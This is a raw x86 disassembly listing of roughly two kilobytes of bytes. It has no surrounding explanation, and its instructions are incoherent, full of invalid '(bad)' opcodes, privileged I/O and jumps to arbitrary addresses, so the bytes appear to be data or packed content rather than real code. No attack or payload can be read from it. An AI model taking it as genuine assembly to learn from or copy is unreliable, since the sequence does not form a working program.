  412459:	sbb    BYTE PTR [ebp+0x7a],ah
  41245c:	sub    ecx,DWORD PTR [edi]
  41245e:	sub    DWORD PTR [eax+0x7353d0ab],ebx
  412464:	push   ss
  412465:	mov    ebx,esp
  412467:	cmp    al,0x1
  412469:	iret   
  41246a:	inc    ebx
  41246b:	sbb    eax,0xee1e159c
  412470:	jo     0x412462
  412472:	dec    ebp
  412473:	and    eax,0x8c8c9500
  412478:	inc    edx
  412479:	or     bl,dl
  41247b:	cs jle 0x4124ae
  41247e:	fnstsw WORD PTR [edi+eiz*4+0x5b]
  412482:	push   cs
  412483:	cdq    
  412484:	(bad)  
  412486:	xchg   esi,eax
  412487:	jg     0x412436
  412489:	and    esi,esp
  41248b:	out    dx,al
  41248c:	cld    
  41248d:	mov    esi,0x6f32953
  412492:	pop    esp
  412493:	cli    
  412494:	inc    edi
  412495:	mov    eax,ds:0x78fbd948
  41249a:	faddp  st(5),st
  41249c:	xchg   edi,eax
  41249d:	inc    esi
  41249e:	xor    al,0xfe
  4124a0:	outs   dx,DWORD PTR ds:[esi]
  4124a1:	or     al,0xd8
  4124a3:	test   eax,0x60691b9c
  4124a8:	jecxz  0x4124c4
  4124aa:	pusha  
  4124ab:	popf   
  4124ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4124ad:	xor    DWORD PTR [ebx],ebp
  4124af:	(bad)  
  4124b0:	inc    edi
  4124b1:	push   ss
  4124b2:	jge    0x41248e
  4124b4:	xor    BYTE PTR [esp+0x4e12f8c3],ah
  4124bb:	jp     0x412484
  4124bd:	adc    al,0x37
  4124bf:	mov    ds:0x7ea1bf32,al
  4124c4:	in     eax,dx
  4124c5:	pop    esp
  4124c6:	pop    es
  4124c7:	cmc    
  4124c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4124c9:	(bad)  
  4124ca:	jecxz  0x41248c
  4124cc:	mov    ebp,0xd9f3fd7b
  4124d1:	xor    dh,BYTE PTR [esp+edx*2+0x31]
  4124d5:	pop    ebp
  4124d6:	cwde   
  4124d7:	popa   
  4124d8:	xchg   ebp,eax
  4124d9:	push   cs
  4124da:	dec    edi
  4124db:	into   
  4124dc:	mov    bl,0xdb
  4124de:	inc    edx
  4124df:	sbb    BYTE PTR [edi],ah
  4124e1:	cmp    eax,0x55d56cdf
  4124e6:	inc    ebp
  4124e7:	mov    dl,0xcf
  4124e9:	stos   DWORD PTR es:[edi],eax
  4124ea:	ret    0x8955
  4124ed:	lahf   
  4124ee:	fst    QWORD PTR [ebx+0x756e82e8]
  4124f4:	pop    edx
  4124f5:	scas   eax,DWORD PTR es:[edi]
  4124f6:	pop    edi
  4124f7:	(bad)  
  4124f8:	in     eax,dx
  4124f9:	mov    dl,0xb5
  4124fb:	xor    BYTE PTR [edx+0x66c8ba6],cl
  412501:	mov    WORD PTR [esi+0xe108ce0],cs
  412507:	dec    ebx
  412508:	es xchg ebp,eax
  41250a:	jmp    DWORD PTR [edi]
  41250c:	mov    ?,WORD PTR [edi+0x48]
  41250f:	or     dl,BYTE PTR [esi]
  412511:	xor    al,0xae
  412513:	std    
  412514:	xor    al,0x46
  412516:	shl    al,0x2f
  412519:	adc    ebx,DWORD PTR [eax]
  41251b:	xchg   edx,eax
  41251c:	cmp    esp,DWORD PTR [ebx+0x6b]
  41251f:	push   ss
  412520:	push   ss
  412521:	and    DWORD PTR [edi],0xab848875
  412527:	jg     0x4124b6
  412529:	xor    eax,0x8d7aab2
  41252e:	fs pop ds
  412530:	iret   
  412531:	gs int3 
  412533:	adc    DWORD PTR [eax*8-0x1ccd7c7a],ecx
  41253a:	popf   
  41253b:	mov    ecx,0x1ac209c4
  412540:	and    al,0xa7
  412542:	(bad)  
  412543:	fisttp WORD PTR [esi+0x36]
  412546:	int3   
  412547:	ror    BYTE PTR [edi],cl
  412549:	shr    DWORD PTR [eax-0x68],1
  41254c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41254d:	adc    esi,ebx
  41254f:	xchg   esp,eax
  412550:	xchg   edx,eax
  412551:	mov    al,ds:0xce830371
  412556:	(bad)  
  412557:	(bad)  
  412559:	pop    edi
  41255a:	sub    DWORD PTR [edx-0x4849ecdf],edx
  412560:	cmp    al,0xf5
  412562:	and    edx,DWORD PTR es:[edx]
  412565:	retf   0xc04c
  412568:	add    eax,DWORD PTR [ecx+0x55]
  41256b:	inc    ecx
  41256c:	push   ecx
  41256d:	inc    esp
  41256e:	mov    ecx,0xcc187796
  412573:	sub    al,0x26
  412575:	mov    esp,0xf94ad9db
  41257a:	sti    
  41257b:	inc    esi
  41257c:	dec    esi
  41257d:	pop    es
  41257e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41257f:	cmp    BYTE PTR [esi-0x4fa5f8f8],bl
  412585:	ret    0x9037
  412588:	pushf  
  412589:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41258a:	xlat   BYTE PTR ds:[ebx]
  41258b:	mov    esi,0x21e48bb5
  412590:	daa    
  412591:	lahf   
  412592:	pop    es
  412593:	sbb    esp,DWORD PTR [ebp+0x42de69f1]
  412599:	pop    ss
  41259a:	into   
  41259b:	fsubr  DWORD PTR [eax]
  41259d:	test   ecx,ebx
  41259f:	imul   BYTE PTR [ebp+0x31]
  4125a2:	(bad)  
  4125a3:	inc    bx
  4125a5:	cmp    DWORD PTR [esi],0x5e
  4125a8:	aaa    
  4125a9:	jnp    0x412556
  4125ab:	lods   al,BYTE PTR ds:[esi]
  4125ac:	fsincos 
  4125ae:	(bad)  
  4125af:	loopne 0x412601
  4125b1:	and    eax,DWORD PTR [ebp+eax*2-0x737f5bc]
  4125b8:	daa    
  4125b9:	xor    DWORD PTR [edi],esp
  4125bb:	pop    es
  4125bc:	pop    esp
  4125bd:	sub    DWORD PTR [eax],ecx
  4125bf:	lock stos DWORD PTR es:[edi],eax
  4125c1:	and    DWORD PTR [edi+0x45],edi
  4125c4:	push   edx
  4125c5:	cdq    
  4125c6:	dec    esi
  4125c7:	aam    0x79
  4125c9:	dec    edi
  4125ca:	mov    dh,0x5b
  4125cc:	mov    esi,0x3a4fd25b
  4125d1:	mov    DWORD PTR [esi-0x80],esp
  4125d4:	dec    BYTE PTR [eax]
  4125d6:	bound  edi,QWORD PTR [esi+ebp*2+0x1e36a455]
  4125dd:	data16 xor BYTE PTR [edx-0x56],cl
  4125e1:	and    al,0x69
  4125e3:	or     BYTE PTR [ebx-0x16],al
  4125e6:	adc    DWORD PTR [edx+ebx*4+0x730ef6d6],eax
  4125ed:	sbb    al,0x1e
  4125ef:	inc    ecx
  4125f0:	inc    edi
  4125f1:	sbb    al,BYTE PTR [edi-0x24]
  4125f4:	std    
  4125f5:	mov    BYTE PTR [eax],dh
  4125f7:	inc    edx
  4125f8:	inc    esp
  4125f9:	adc    DWORD PTR [ecx],ebp
  4125fb:	stc    
  4125fc:	mov    edi,0xc7170113
  412601:	sub    cl,BYTE PTR cs:[edi-0x627e4765]
  412608:	js     0x41263d
  41260a:	mov    WORD PTR [edi-0x6f],es
  41260d:	push   cs
  41260e:	(bad)  
  412610:	adc    DWORD PTR ds:0xbd47bc5,esp
  412616:	xor    ebp,DWORD PTR [ebx-0x71186912]
  41261c:	xchg   al,ah
  41261e:	dec    esi
  41261f:	sub    eax,0x2c566369
  412624:	imul   ebp,DWORD PTR [ebp+esi*4+0x451a40d3],0x2788e7bd
  41262f:	add    eax,0x3564278d
  412634:	jbe    0x412678
  412636:	test   DWORD PTR [edx+0x6082be04],ebx
  41263c:	or     BYTE PTR [edx],0xc9
  41263f:	mov    bh,0x7
  412641:	and    DWORD PTR [ecx+0x46affdf],ebx
  412647:	push   edx
  412648:	pop    ds
  412649:	es retf 
  41264b:	adc    al,0xf2
  41264d:	adc    eax,0x2feaee62
  412652:	cli    
  412653:	cmp    esp,edi
  412655:	push   ecx
  412656:	sub    edi,DWORD PTR [esi-0x1fcef67e]
  41265c:	addr16 cld 
  41265e:	adc    BYTE PTR [ebx],bh
  412660:	ret    0x4ee8
  412663:	mov    dl,0xa8
  412665:	mov    edx,0xc8ef1a46
  41266a:	pop    edx
  41266b:	pop    ds
  41266c:	inc    ebx
  41266d:	test   eax,ecx
  41266f:	xchg   edx,eax
  412670:	lods   eax,DWORD PTR ds:[esi]
  412671:	xchg   ebx,eax
  412672:	mov    ds:0xa7771596,al
  412677:	push   0xe6a62311
  41267c:	mov    dl,BYTE PTR gs:[eax+ecx*8]
  412680:	jl     0x412695
  412682:	sbb    cl,ah
  412684:	sti    
  412685:	pop    edx
  412686:	(bad)  
  412687:	outs   dx,DWORD PTR ds:[esi]
  412688:	rcr    BYTE PTR [esi-0x69060f7a],0xfc
  41268f:	and    DWORD PTR [esi],esi
  412691:	bound  ebx,QWORD PTR [ebp+0x2f]
  412694:	call   0x48dc2539
  412699:	sub    eax,0x38202273
  41269e:	pop    eax
  41269f:	aam    0x81
  4126a1:	jecxz  0x41263f
  4126a3:	dec    edi
  4126a4:	and    DWORD PTR [edi+0x9063afe],ecx
  4126aa:	jmp    0x41267e
  4126ac:	sbb    al,0x6f
  4126ae:	or     cl,BYTE PTR [edi-0x6d]
  4126b1:	clc    
  4126b2:	push   edx
  4126b3:	jmp    0x412719
  4126b5:	mov    ch,0x1a
  4126b7:	test   DWORD PTR [esi],eax
  4126b9:	inc    ebp
  4126ba:	inc    edi
  4126bb:	les    ecx,FWORD PTR [eax]
  4126bd:	daa    
  4126be:	call   FWORD PTR [ecx]
  4126c0:	gs mov cl,0x8e
  4126c3:	dec    eax
  4126c4:	popf   
  4126c5:	arpl   WORD PTR [eax],di
  4126c7:	pusha  
  4126c8:	fiadd  DWORD PTR [edx+0x33701384]
  4126ce:	imul   eax,DWORD PTR [ebx],0xffffffe8
  4126d1:	sahf   
  4126d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4126d3:	mov    bl,0x43
  4126d5:	mov    al,ds:0x2732ed9d
  4126da:	adc    esi,DWORD PTR [edi]
  4126dc:	jns    0x412697
  4126de:	push   ds
  4126df:	dec    ecx
  4126e0:	xlat   BYTE PTR ds:[ebx]
  4126e1:	or     eax,0xeac3040e
  4126e6:	xor    bl,dh
  4126e8:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  4126ea:	daa    
  4126eb:	and    eax,0x2d67e72
  4126f0:	fcomp  DWORD PTR [edx]
  4126f2:	mov    ds:0xd8dd6cb9,al
  4126f7:	stc    
  4126f8:	dec    ebx
  4126f9:	(bad)  
  4126fa:	jge    0x4126cb
  4126fc:	sub    DWORD PTR [esi+ebp*4],ebx
  4126ff:	(bad)  
  412700:	jge    0x4126aa
  412702:	sub    bl,cl
  412704:	xor    eax,0xbc570a46
  412709:	(bad)  
  41270a:	inc    ebp
  41270b:	(bad)  
  41270c:	cwde   
  41270d:	outs   dx,BYTE PTR ds:[esi]
  41270e:	rcr    BYTE PTR ds:0x869c888f,0xc5
  412715:	inc    ebx
  412716:	and    al,0x26
  412718:	(bad)  
  41271b:	clc    
  41271c:	jb     0x412730
  41271e:	jmp    0xe86c83a2
  412723:	xchg   ebp,eax
  412724:	mov    dh,0xa6
  412726:	mov    ebp,0x867a9e2d
  41272b:	inc    esp
  41272c:	mov    BYTE PTR ds:0xb8f80745,bh
  412732:	fdiv   QWORD PTR [eax]
  412734:	or     eax,0x874b8273
  412739:	fsub   DWORD PTR [eax+0x22]
  41273c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41273d:	and    DWORD PTR [ebx-0x4c],edx
  412740:	mov    ecx,0xceef601d
  412745:	mov    bh,0x7e
  412747:	pop    esi
  412748:	jnp    0x412764
  41274a:	add    BYTE PTR [ecx-0x1d],dl
  41274d:	repnz mov ch,0xba
  412750:	push   es
  412751:	leave  
  412752:	shr    DWORD PTR [eax+ebx*4-0x1c96e685],0x43
  41275a:	std    
  41275b:	mov    ah,0x59
  41275d:	add    eax,0xb55d5c1c
  412762:	repnz dec ebp
  412764:	pop    ebx
  412765:	pop    ds
  412766:	in     eax,dx
  412767:	inc    eax
  412768:	test   dl,dh
  41276a:	pop    eax
  41276b:	pop    ss
  41276c:	cdq    
  41276d:	xchg   DWORD PTR [edx-0x728881e0],eax
  412773:	loope  0x4127ec
  412775:	bound  eax,QWORD PTR [edi]
  412777:	cwde   
  412778:	jl     0x412797
  41277a:	pmaddwd mm3,QWORD PTR [ebx-0x3569fe81]
  412781:	mov    ds:0x2fc3fc03,eax
  412786:	jg     0x4127f5
  412788:	mov    dh,0xd9
  41278a:	pop    ecx
  41278b:	dec    esp
  41278c:	aad    0x81
  41278e:	loop   0x41274a
  412790:	dec    esp
  412791:	cdq    
  412792:	xor    ecx,DWORD PTR [ecx+0x1ebe60a2]
  412798:	xor    BYTE PTR [esi+0x636f78e5],al
  41279e:	mov    DWORD PTR [eax-0x5c87268],esp
  4127a4:	adc    edi,0x1b33bbcc
  4127aa:	rol    DWORD PTR [ecx+eiz*2+0x0],cl
  4127ae:	jle    0x41278e
  4127b0:	icebp  
  4127b1:	lods   al,BYTE PTR ds:[esi]
  4127b2:	pushf  
  4127b3:	mov    ah,0x88
  4127b5:	push   ds
  4127b6:	or     BYTE PTR [eax-0x2f],bl
  4127b9:	or     eax,DWORD PTR [esp+eiz*4+0x5ea40f24]
  4127c0:	sub    DWORD PTR [ebp-0x3405ced6],ebp
  4127c6:	cli    
  4127c7:	xchg   edx,eax
  4127c8:	pop    es
  4127c9:	fcomp  DWORD PTR [ecx+edx*8+0xd396ee3]
  4127d0:	loop   0x412765
  4127d2:	out    0xa7,al
  4127d4:	test   eax,0xd3a87cba
  4127d9:	push   0x7b62ce6
  4127de:	sub    bh,BYTE PTR [esi+eax*8]
  4127e1:	mov    ds:0x5108d134,al
  4127e6:	inc    ecx
  4127e7:	push   0xffffffed
  4127e9:	pushf  
  4127ea:	push   0x50
  4127ec:	jno    0x4127ea
  4127ee:	sbb    ecx,esi
  4127f0:	test   DWORD PTR [edi+ecx*2],edx
  4127f3:	pop    ds
  4127f4:	call   0x9940:0x4b77055e
  4127fb:	popf   
  4127fc:	pop    esp
  4127fd:	dec    esp
  4127fe:	add    dl,0x69
  412801:	mov    esi,0x3bcb3019
  412806:	sub    al,0x94
  412808:	sbb    bl,BYTE PTR [ebx+0x6]
  41280b:	jmp    0x4127db
  41280d:	adc    DWORD PTR [ecx+0x33],edi
  412810:	jg     0x41279e
  412812:	ret    0x487f
  412815:	clc    
  412816:	dec    edi
  412817:	(bad)  
  412818:	sbb    al,0x43
  41281a:	test   al,0x4e
  41281c:	dec    eax
  41281d:	jl     0x412889
  41281f:	stos   DWORD PTR es:[edi],eax
  412820:	xchg   esi,eax
  412821:	or     ah,al
  412823:	fldz   
  412825:	or     BYTE PTR [ebx+0x3b],bl
  412828:	(bad)  
  412829:	jge    0x41284f
  41282b:	std    
  41282c:	adc    eax,edi
  41282e:	push   cs
  41282f:	mov    ecx,0xdd3463e3
  412834:	ss sub eax,edi
  412837:	inc    ebp
  412838:	mov    ebx,0x6c7e27b8
  41283d:	ins    DWORD PTR es:[edi],dx
  41283e:	sahf   
  41283f:	outs   dx,DWORD PTR ds:[esi]
  412840:	add    DWORD PTR [edx+ecx*2+0x54],edi
  412844:	bound  ecx,QWORD PTR [edi+0x7a618876]
  41284a:	inc    eax
  41284b:	fisttp WORD PTR [edx+edi*4+0x3782d36d]
  412852:	test   eax,0x969fd2d5
  412857:	dec    ecx
  412858:	out    0x23,eax
  41285a:	add    dh,BYTE PTR [eax]
  41285c:	cmp    eax,0x8979e5d0
  412861:	cs pushf 
  412863:	lods   eax,DWORD PTR ds:[esi]
  412864:	pop    esp
  412865:	aaa    
  412866:	jp     0x412845
  412868:	fidivr DWORD PTR [esi-0x2dab7530]
  41286e:	repnz and esi,DWORD PTR [ecx-0x383fdef]
  412875:	xlat   BYTE PTR ds:[ebx]
  412876:	ret    0x7405
  412879:	ficomp DWORD PTR [esi-0x6f]
  41287c:	sti    
  41287d:	xor    dl,BYTE PTR [edi-0x69095181]
  412883:	fwait
  412884:	ins    BYTE PTR es:[edi],dx
  412885:	fadd   QWORD PTR [eax-0x7165ee66]
  41288b:	jle    0x4128ec
  41288d:	fdiv   st(3),st
  41288f:	add    eax,0xeb5f6307
  412894:	int    0x56
  412896:	aad    0xff
  412898:	out    0x26,eax
  41289a:	out    dx,al
  41289b:	iret   
  41289c:	outs   dx,DWORD PTR ds:[esi]
  41289d:	mov    BYTE PTR [ebx-0x3f738a3e],ch
  4128a3:	pop    edi
  4128a4:	cmp    al,0x10
  4128a6:	popa   
  4128a7:	(bad)  
  4128a8:	xlat   BYTE PTR ds:[ebx]
  4128aa:	loop   0x4128a5
  4128ac:	sub    dl,BYTE PTR [ecx+0x55]
  4128af:	push   ss
  4128b0:	mov    al,ds:0xf5b96a59
  4128b5:	adc    ebx,ecx
  4128b7:	pandn  mm7,QWORD PTR [edx-0x15e4ee86]
  4128be:	pop    esp
  4128bf:	std    
  4128c0:	popa   
  4128c1:	cmp    eax,0x694d6b6b
  4128c6:	push   ebx
  4128c7:	test   esi,esi
  4128c9:	fnstcw WORD PTR cs:[ebx+edi*2-0x1b00b7ac]
  4128d1:	loopne 0x4128cb
  4128d3:	stos   DWORD PTR es:[edi],eax
  4128d4:	inc    esi
  4128d5:	je     0x4128ed
  4128d7:	mov    eax,ds:0xc416c5d3
  4128dc:	xchg   ebx,eax
  4128dd:	mov    ebp,DWORD PTR [ebp-0x77]
  4128e0:	fisttp DWORD PTR [ebx-0x78b093f9]
  4128e6:	pusha  
  4128e7:	jmp    0x41289b
  4128e9:	outs   dx,BYTE PTR ds:[esi]
  4128ea:	sub    cl,al
  4128ec:	cmp    DWORD PTR [ebx+0x9cab249],esp
  4128f2:	jecxz  0x412876
  4128f4:	mov    bl,0xb7
  4128f6:	xchg   ecx,eax
  4128f7:	sahf   
  4128f8:	dec    ecx
  4128f9:	loop   0x41294d
  4128fb:	or     edx,DWORD PTR [ebx+0x1f]
  4128fe:	sub    ebp,DWORD PTR [edi-0xd1c887f]
  412904:	aad    0x49
  412906:	scas   al,BYTE PTR es:[edi]
  412907:	dec    edx
  412908:	xor    al,0x61
  41290a:	pusha  
  41290b:	popa   
  41290c:	fwait
  41290d:	mov    ebp,?
  41290f:	out    0xaf,eax
  412911:	or     edi,ebp
  412913:	jmp    0x9220:0xbea9697f
  41291a:	sub    eax,0x507c3387
  41291f:	and    BYTE PTR [ecx],bl
  412921:	dec    edi
  412922:	adc    edi,DWORD PTR [ecx-0x1154aa62]
  412928:	xchg   edi,eax
  412929:	pop    eax
  41292a:	xor    al,0x7d
  41292c:	add    al,0x64
  41292e:	mov    WORD PTR [eax-0x7b],es
  412931:	or     eax,0x9cec8bf6
  412936:	push   edi
  412937:	aaa    
  412938:	div    BYTE PTR [edx]
  41293a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41293b:	push   esi
  41293c:	stos   DWORD PTR es:[edi],eax
  41293d:	in     al,dx
  41293e:	cmp    eax,0xf0e9cb7f
  412943:	adc    BYTE PTR [ebp+0x3dc7e29f],0xf3
  41294a:	push   0xffffffa7
  41294c:	jmp    0x68ba:0x59f0bad6
  412953:	sub    cl,BYTE PTR [edx]
  412955:	jle    0x4129bb
  412957:	inc    ecx
  412958:	push   ss
  412959:	adc    dh,bl
  41295b:	and    BYTE PTR [edi+0x6a],dl
  41295e:	inc    ecx
  41295f:	into   
  412960:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412961:	inc    ecx
  412962:	adc    bh,BYTE PTR [edx]
  412964:	stc    
  412965:	sbb    al,0x5f
  412967:	retf   
  412968:	scas   al,BYTE PTR es:[edi]
  412969:	push   ecx
  41296a:	hlt    
  41296b:	and    ecx,edi
  41296d:	aas    
  41296e:	jnp    0x4129d1
  412970:	loopne 0x41297e
  412972:	out    0x86,al
  412974:	das    
  412975:	out    dx,eax
  412976:	and    BYTE PTR [ebp+ebp*2-0x73a3ca1d],al
  41297d:	mov    esp,0xcdb2a9d6
  412982:	sbb    al,0x5b
  412984:	retf   0x141e
  412987:	ret    
  412988:	(bad)  
  412989:	and    al,cl
  41298b:	fisttp DWORD PTR [edx]
  41298d:	test   DWORD PTR [eax+0x34529e7a],0xc3596580
  412997:	es in  al,0x5e
  41299a:	jno    0x4129b5
  41299c:	ja     0x412946
  41299e:	pop    ebx
  41299f:	pop    ecx
  4129a0:	sub    edx,ebx
  4129a2:	inc    esp
  4129a3:	xchg   ebp,edi
  4129a5:	daa    
  4129a6:	(bad)
  4129a9:	cmp    BYTE PTR [ebx-0x64],bl
  4129ac:	mov    edi,0xb44602ba
  4129b1:	push   edi
  4129b2:	fldcw  WORD PTR [edx-0x57]
  4129b5:	cdq    
  4129b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4129b7:	xchg   edi,eax
  4129b8:	jmp    0xfaddcbad
  4129bd:	into   
  4129be:	dec    esp
  4129bf:	ss je  0x4129a4
  4129c2:	xchg   BYTE PTR [ecx],bh
  4129c4:	(bad)  
  4129c5:	enter  0xce,0x2
  4129c9:	das    
  4129ca:	add    BYTE PTR ds:0x2bcba879,ch
  4129d0:	pand   mm3,QWORD PTR [esi-0x7bc06ba9]
  4129d7:	jge    0x41296c
  4129d9:	dec    esi
  4129da:	push   eax
  4129db:	ret    
  4129dc:	inc    edx
  4129dd:	ins    BYTE PTR es:[edi],dx
  4129de:	xchg   esi,eax
  4129df:	ins    DWORD PTR es:[edi],dx
  4129e0:	cmp    BYTE PTR [esp+edi*4-0x14],0x1c
  4129e5:	ds adc eax,0xb6581ec6
  4129eb:	into   
  4129ec:	push   ss
  4129ed:	push   edx
  4129ee:	enter  0x7442,0xa1
  4129f2:	pushf  
  4129f3:	iret   
  4129f4:	dec    eax
  4129f5:	rcl    BYTE PTR [edx+eax*4],1
  4129f8:	enter  0x4a4d,0x83
  4129fc:	outs   dx,DWORD PTR ds:[esi]
  4129fd:	xor    eax,0x75c7a1c9
  412a02:	add    DWORD PTR [esp+edx*1-0x16],0xffffffdc
  412a07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a08:	adc    esp,DWORD PTR [esi]
  412a0a:	retf   0x70f1
  412a0d:	dec    ebp
  412a0e:	(bad)  
  412a0f:	sub    eax,0x83b410f5
  412a14:	in     al,dx
  412a15:	adc    DWORD PTR ds:0xb417312a,ebx
  412a1b:	mov    bh,0x3a
  412a1d:	jle    0x4129d6
  412a1f:	push   ecx
  412a20:	pushf  
  412a21:	(bad)  
  412a22:	into   
  412a23:	xchg   DWORD PTR [ebp-0x163b649e],edi
  412a29:	ret    
  412a2a:	int    0xca
  412a2c:	shl    bl,cl
  412a2e:	je     0x4129da
  412a30:	bound  ecx,QWORD PTR [edi]
  412a32:	ret    
  412a33:	aad    0x13
  412a35:	sti    
  412a36:	inc    esi
  412a37:	mov    dl,0xf7
  412a39:	fcmovu st,st(7)
  412a3b:	mov    ebp,0xcd7c2638
  412a40:	push   esp
  412a41:	add    eax,0x28e4d17b
  412a46:	shl    DWORD PTR [ebx-0xfbbeabe],cl
  412a4c:	dec    esp
  412a4d:	sbb    DWORD PTR [edi+ebp*8-0x2ede5ecb],ebx
  412a54:	stc    
  412a55:	push   ecx
  412a56:	push   ds
  412a57:	or     edx,esp
  412a59:	aaa    
  412a5a:	xor    al,0x7
  412a5c:	or     edi,DWORD PTR [esi+0xc133fe]
  412a62:	jp     0x412a95
  412a64:	imul   esi,DWORD PTR fs:[edi-0x3a],0x39
  412a69:	icebp  
  412a6a:	and    ch,BYTE PTR ds:0x68ec3c43
  412a70:	cmp    edi,DWORD PTR [ebp+0xb]
  412a73:	ja     0x412a7c
  412a75:	call   0xe017:0xb2ab241e
  412a7c:	inc    eax
  412a7d:	test   DWORD PTR [edx],edi
  412a7f:	fcmovu st,st(3)
  412a81:	or     ch,cl
  412a83:	cmp    dh,BYTE PTR [ecx+0x7cd2ee0a]
  412a89:	rcl    DWORD PTR [edx+0x1149e8bd],1
  412a8f:	pop    ebx
  412a90:	xchg   esi,eax
  412a91:	jbe    0x412a91
  412a93:	lds    ebx,FWORD PTR ds:0x8ec301b1
  412a99:	mov    ebx,DWORD PTR [edx+0x73fa5d93]
  412a9f:	in     eax,dx
  412aa0:	or     esi,eax
  412aa2:	sti    
  412aa3:	bound  edx,QWORD PTR [esp+ecx*4]
  412aa6:	inc    edx
  412aa7:	addr16 (bad) 
  412aa9:	sub    dl,BYTE PTR [ecx-0x34c56fc4]
  412aaf:	out    0x43,eax
  412ab1:	test   eax,0xc8a257bf
  412ab6:	ror    DWORD PTR [esi-0x1470ff1e],1
  412abc:	cmp    eax,0x8a4f6848
  412ac1:	xor    eax,0xe6a7f2df
  412ac6:	repz add dh,BYTE PTR ds:0xf2ac
  412acc:	rcr    BYTE PTR [edi],0x15
  412acf:	push   0xffffffcb
  412ad1:	cli    
  412ad2:	(bad)  
  412ad3:	mov    bh,0xd5
  412ad5:	fdiv   DWORD PTR [ecx+0x77efd037]
  412adb:	mov    al,ds:0x9aace12f
  412ae0:	lods   eax,DWORD PTR ds:[esi]
  412ae1:	mov    dh,0x58
  412ae3:	sar    BYTE PTR [edi],0x66
  412ae6:	pop    esi
  412ae7:	enter  0xf2ff,0xde
  412aeb:	pop    edx
  412aec:	xchg   esi,eax
  412aed:	adc    ebp,ecx
  412aef:	sub    bx,WORD PTR ds:0x9310d584
  412af6:	adc    eax,0x41b35796
  412afb:	fild   DWORD PTR [ebx+eax*4-0x479b5f9f]
  412b02:	push   esi
  412b03:	xchg   ebx,eax
  412b04:	inc    eax
  412b05:	data16 in al,0x59
  412b08:	stos   BYTE PTR es:[edi],al
  412b09:	or     DWORD PTR [edi],0x24dd9472
  412b0f:	mov    bh,0x92
  412b11:	adc    ch,BYTE PTR [ebx-0x7777d33d]
  412b17:	aaa    
  412b18:	icebp  
  412b19:	lods   eax,DWORD PTR ds:[esi]
  412b1a:	ins    BYTE PTR es:[edi],dx
  412b1b:	scas   al,BYTE PTR es:[edi]
  412b1c:	hlt    
  412b1d:	mov    dl,0xc3
  412b1f:	(bad)  
  412b20:	push   eax
  412b21:	xor    DWORD PTR [esi],0xe
  412b24:	and    eax,edx
  412b26:	aas    
  412b27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b28:	das    
  412b29:	arpl   WORD PTR [ecx],dx
  412b2b:	mov    ebx,0x5a931a11
  412b30:	retf   
  412b31:	popa   
  412b32:	inc    edx
  412b33:	int3   
  412b34:	pop    es
  412b35:	sbb    eax,ebp
  412b37:	and    dh,BYTE PTR [esi]
  412b39:	add    BYTE PTR [ebx-0x3b],dl
  412b3c:	and    DWORD PTR [edx],edi
  412b3e:	ja     0x412ac6
  412b40:	mov    ecx,edi
  412b42:	mov    dl,0x9a
  412b44:	mov    eax,ds:0x340c2124
  412b49:	pop    esi
  412b4a:	cmp    DWORD PTR [esi],0x72
  412b4d:	rcr    BYTE PTR [edx],0x26
  412b50:	push   0xfffffffb
  412b52:	cdq    
  412b53:	loopne 0x412b5b
  412b55:	sti    
  412b56:	jnp    0x412b1a
  412b58:	mov    esi,0xe763f02c
  412b5d:	pop    edx
  412b5e:	hlt    
  412b5f:	ins    BYTE PTR es:[edi],dx
  412b60:	(bad)  
  412b62:	dec    BYTE PTR [ebp+0x588931f]
  412b68:	pusha  
  412b69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b6a:	leave  
  412b6b:	ins    BYTE PTR es:[edi],dx
  412b6c:	adc    dl,0xb8
  412b6f:	std    
  412b70:	sbb    edx,edi
  412b72:	jno    0x412ba7
  412b74:	pop    ss
  412b75:	pop    ebp
  412b76:	add    DWORD PTR [ecx],0x557b11d6
  412b7c:	data16 jo 0x412ba6
  412b7f:	push   ss
  412b80:	pusha  
  412b81:	aas    
  412b82:	repnz sbb BYTE PTR [ebx-0x32],0x5b
  412b87:	cmp    eax,0x21753258
  412b8c:	push   0xfffffff1
  412b8e:	jmp    0xf18c3a75
  412b93:	sbb    bl,BYTE PTR [esi+edi*2-0x26bd0da0]
  412b9a:	xchg   esp,eax
  412b9b:	pop    ebx
  412b9c:	xor    al,0x43
  412b9e:	mov    edx,0xb3061525
  412ba3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ba4:	jmp    0x412bca
  412ba6:	xchg   ebp,eax
  412ba7:	js     0x412b59
  412ba9:	out    0xdd,al
  412bab:	std    
  412bac:	sub    DWORD PTR ds:0x9b2c5a,edx
  412bb2:	mov    bh,0xc5
  412bb4:	(bad)  
  412bb5:	retf   
  412bb6:	xor    BYTE PTR [esi+0x4393f42c],cl
  412bbc:	push   esi
  412bbd:	sub    eax,DWORD PTR [eax+ecx*2-0x2]
  412bc1:	loopne 0x412b7b
  412bc3:	inc    ebp
  412bc4:	xchg   edx,eax
  412bc5:	lods   al,BYTE PTR cs:[esi]
  412bc7:	dec    esi
  412bc8:	or     DWORD PTR [eax+0x3aface99],esi
  412bce:	jmp    0xf34715d4
  412bd3:	test   BYTE PTR [ebp+edx*4+0x3d],dl
  412bd7:	stos   DWORD PTR es:[edi],eax
  412bd8:	pop    es
  412bd9:	scas   eax,DWORD PTR es:[edi]
  412bda:	bound  edx,QWORD PTR [esi]
  412bdc:	into   
  412bdd:	aam    0x4f
  412bdf:	shl    DWORD PTR [ecx],cl
  412be1:	lahf   
  412be2:	push   edx
  412be3:	out    0xe0,al
  412be5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412be6:	pushf  
  412be7:	add    BYTE PTR [ebx],cl
  412be9:	mov    eax,ds:0xa3dfcf2f
  412bee:	fisubr DWORD PTR [ecx+ecx*4-0x4dee65aa]
